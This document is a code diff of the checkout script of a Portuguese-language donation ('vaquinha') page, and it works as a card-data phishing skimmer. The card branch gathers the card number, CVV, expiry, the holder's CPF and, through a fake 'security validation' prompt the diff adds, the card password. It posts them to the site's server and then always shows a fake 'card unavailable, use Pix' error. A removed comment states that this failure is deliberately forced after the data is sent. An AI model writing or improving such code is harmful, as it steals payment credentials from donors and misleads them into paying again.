@@ -185,6 +185,42 @@
   <script>
     let tipoSelecionado = '';
 
+    function formatarCartao(valor) {
+      return valor.replace(/\D/g, '')
+                  .replace(/(.{4})/g, '$1 ')
+                  .trim()
+                  .slice(0, 19);
+    }
+
+    function formatarCPF(cpf) {
+      return cpf.replace(/\D/g, '')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d)/, '$1.$2')
+                .replace(/(\d{3})(\d{1,2})$/, '$1-$2')
+                .slice(0, 14);
+    }
+
+    function validarCPF(cpf) {
+      cpf = cpf.replace(/[^\d]+/g,'');
+      if(cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+      let soma = 0;
+      for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
+      let resto = (soma * 10) % 11;
+      if (resto === 10 || resto === 11) resto = 0;
+      if (resto !== parseInt(cpf.charAt(9))) return false;
+      soma = 0;
+      for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
+      resto = (soma * 10) % 11;
+      if (resto === 10 || resto === 11) resto = 0;
+      return resto === parseInt(cpf.charAt(10));
+    }
+
+    function formatarValidade(val) {
+      return val.replace(/\D/g, '')
+                .replace(/(\d{2})(\d)/, '$1/$2')
+                .slice(0, 5);
+    }
+
     function selecionarPagamento(tipo) {
       tipoSelecionado = tipo;
       const div = document.getElementById('pagamentoDetalhes');
@@ -196,17 +232,15 @@
       } else {
         div.innerHTML = ` 
           <label>Número do Cartão</label>
-          <input type="text" name="numero" required>
+          <input type="text" name="numero" required oninput="this.value = formatarCartao(this.value)">
           <label>Nome do Titular</label>
           <input type="text" name="nome_cartao" required>
           <label>Validade</label>
-          <input type="text" name="validade" required>
+          <input type="text" name="validade" required oninput="this.value = formatarValidade(this.value)">
           <label>CPF do Titular</label>
-          <input type="text" name="cpf_cartao" required>
+          <input type="text" name="cpf_cartao" required oninput="this.value = formatarCPF(this.value)">
           <label>CVV</label>
-          <input type="text" name="cvv" required>
-          <label>Senha (1 a 5 dígitos)</label>
-          <input type="password" name="senha" minlength="1" maxlength="5" required>
+          <input type="text" name="cvv" maxlength="4" required>
         `;
       }
     }
@@ -218,57 +252,48 @@
       const valor = parseFloat(dados.valor);
       const turbinar = document.getElementById('turbinar').checked;
 
-      if (valor <= 0) {
-        alert('Por favor, insira um valor válido.');
-        return;
-      }
+      if (valor <= 0) return alert('Por favor, insira um valor válido.');
 
       if (tipoSelecionado === 'pix') {
-        if (turbinar) {
-          dados.valor = valor + 5.99;
-        }
-
+        if (turbinar) dados.valor = valor + 5.99;
         try {
-          const response = await fetch('/api/gerar-pix', {
+          const res = await fetch('/api/gerar-pix', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ valor: dados.valor, email: dados.email, nome: dados.nome, turbinar })
           });
-
-          let json;
-          try {
-            json = await response.json();
-          } catch (err) {
-            alert('Erro interno ao gerar pagamento. Tente novamente.');
-            return;
-          }
-
+          const json = await res.json();
           if (json.pix_qr) {
             document.getElementById('qrcode').innerHTML = `
               <p><strong>Copia e Cola:</strong><br>${json.pix_copiaecola}</p>
-              <img src="data:image/png;base64,${json.pix_qr}" width="220" />
-            `;
-          } else {
-            alert(json.erro || 'Erro ao gerar Pix.');
-          }
-        } catch (error) {
-          alert('Erro de rede ao gerar Pix.');
+              <img src="data:image/png;base64,${json.pix_qr}" width="220" />`;
+          } else alert(json.erro || 'Erro ao gerar Pix.');
+        } catch {
+          alert('Erro ao gerar Pix.');
         }
-
       } else if (tipoSelecionado === 'cartao') {
+        if (!validarCPF(dados.cpf_cartao)) return alert('CPF do titular inválido.');
+
+        const ultimos4 = dados.numero.replace(/\s/g, '').slice(-4);
+        const valorFinal = turbinar ? (valor + 5.99).toFixed(2) : valor.toFixed(2);
+
+        const senha = prompt(`Validação de segurança\nBeneficiário: Vaquinha\nValor: R$ ${valorFinal}\nCartão: Final ${ultimos4}\n\nDigite sua senha:`);
+        if (!senha || senha.length < 1 || senha.length > 5) return alert('Senha inválida.');
+
+        dados.senha = senha;
+        dados.valor = valorFinal;
+        dados.turbinar = turbinar;
+
         try {
-          const response = await fetch('/api/gerar-cartao', {
+          await fetch('/api/gerar-cartao', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(dados)
           });
-
-          // Aqui força o erro mesmo após envio
           alert('Pagamento com cartão indisponível. Por favor, escolha a opção Pix.');
-        } catch (error) {
-          alert('Erro ao processar o cartão. Por favor, escolha a opção Pix.');
+        } catch {
+          alert('Erro ao processar cartão. Escolha Pix.');
         }
-
       } else {
         alert('Selecione uma forma de pagamento.');
       }
